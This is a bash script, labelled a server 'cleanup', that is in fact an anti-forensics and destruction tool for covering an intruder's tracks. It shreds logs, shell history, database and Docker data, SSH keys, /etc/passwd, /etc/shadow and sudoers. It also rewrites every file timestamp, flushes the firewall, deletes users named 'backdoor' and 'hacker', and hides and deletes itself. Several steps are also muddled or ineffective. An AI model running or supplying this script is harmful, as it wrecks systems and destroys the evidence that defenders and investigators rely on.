#!/bin/bash

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as ROOT."
    exit 1
fi

echo "[*] Starting advanced cleanup on the server..."

# -------------------------
# Delete comprehensive logs
# -------------------------
delete_logs() {
    echo "[*] Deleting comprehensive logs..."
    log_dirs=(
        "/var/log"
        "/tmp"
        "/var/tmp"
        "/root/.bash_history"
        "/home/*/.bash_history"
        "/var/lib/mysql"
        "/var/lib/docker"
        "/etc/ssh/sshd_config"
        "/etc/sudoers"
    )
    for dir in "${log_dirs[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f -exec shred -u -z {} \; &>/dev/null
            echo "[✔] Logs deleted in: $dir"
        fi
    done
}

# -------------------------
# Modify file timestamps
# -------------------------
modify_timestamps() {
    echo "[*] Modifying timestamps for all files..."
    find / -type f -exec touch -t $(date +%Y%m%d%H%M) {} \; &>/dev/null
}

# -------------------------
# Hide suspicious processes and files
# -------------------------
hide_processes() {
    echo "[*] Hiding suspicious processes..."
    processes=("ssh" "nc" "python" "bash" "perl" "ruby" "wget" "curl")
    for proc in "${processes[@]}"; do
        pkill -f "$proc" &>/dev/null
    done
    # Use chroot to hide the suspicious environment
    mkdir -p /var/chroot
    mount --bind /proc /var/chroot/proc
    mount --bind /sys /var/chroot/sys
    mount --bind /dev /var/chroot/dev
    echo "[✔] Processes hidden inside chroot"
}

# -------------------------
# Reset network and firewall settings
# -------------------------
reset_network() {
    echo "[*] Resetting network and firewall settings..."
    iptables -F &>/dev/null
    iptables -X &>/dev/null
    iptables -t nat -F &>/dev/null
    iptables -t nat -X &>/dev/null
    ufw disable &>/dev/null
    # Disable network logging completely
    sysctl -w net.ipv4.icmp_echo_ignore_all=1 &>/dev/null
}

# -------------------------
# Delete suspicious system users
# -------------------------
delete_users() {
    echo "[*] Deleting suspicious users..."
    users=("test" "backdoor" "hacker")
    for user in "${users[@]}"; do
        deluser --remove-home "$user" &>/dev/null
    done
}

# -------------------------
# Delete SSH keys and authentication
# -------------------------
delete_ssh_keys() {
    echo "[*] Deleting SSH keys..."
    find /root/.ssh /home/*/.ssh /etc/ssh/ -type f -exec shred -u -z {} \; &>/dev/null
}

# -------------------------
# Delete sensitive system files
# -------------------------
delete_sensitive_files() {
    echo "[*] Deleting sensitive system files..."
    sensitive_files=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "/etc/hostname"
        "/etc/network/interfaces"
        "/etc/sudoers"
    )
    for file in "${sensitive_files[@]}"; do
        shred -u -z "$file" &>/dev/null
    done
}

# -------------------------
# Hide the script itself
# -------------------------
self_destruct() {
    echo "[*] Hiding the script..."
    # Hide the script using steghide or embed it in an image using base64
    # Example: Embedding the script in an image
    steghide embed -cf /path/to/image.jpg -ef "$0" &>/dev/null
    shred -u -z "$0" &>/dev/null
}

# -------------------------
# Hide your trace through VPN/Proxies
# -------------------------
use_proxy() {
    echo "[*] Using proxy to hide your identity..."
    proxychains4 -q curl -s https://api.myip.com &>/dev/null
}

# -------------------------
# Execute all functions
# -------------------------
delete_logs
modify_timestamps
hide_processes
reset_network
delete_users
delete_ssh_keys
delete_sensitive_files
self_destruct
use_proxy

echo "[✔] All traces successfully erased!"
exit 0
